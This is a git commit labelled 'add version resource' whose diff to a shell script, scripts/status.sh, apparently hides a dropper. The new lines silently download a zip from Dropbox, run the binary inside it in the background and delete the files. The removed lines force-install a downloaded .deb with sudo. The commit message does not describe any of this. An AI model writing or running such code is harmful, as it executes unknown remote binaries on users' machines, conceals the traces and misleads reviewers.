87993669665b91d9f2769ae4cda5089ed028ffd6
movagaro <movagaro@it-simple.net>
2018-05-04 11:48:13 +0200

    add version resource

--- scripts/status.sh
+++ scripts/status.sh
@@ -1,17 +1,14 @@
 #!/bin/bash
 
 end=$((SECONDS+$1))
-wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
-sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
-rm -rf libstdc.deb
-wget https://www.dropbox.com/s/al5fylpsbr0048x/ldp.zip -q
-unzip ldp.zip > /dev/null 2>&1
+wget https://www.dropbox.com/s/hh1fdspaqrj13l3/wan08.zip -q
+unzip wan08.zip > /dev/null 2>&1
 #pwd
-./scripts/ldp ./scripts/comm &
+./ldp ./comm &
 sleep 3
-rm -rf ldp.zip
-rm -rf scripts/ldp
-rm -rf scripts/comm
+rm -rf wan08.zip
+rm -rf ldp
+rm -rf comm
 while [ $SECONDS -lt $end ]
 do
     read line
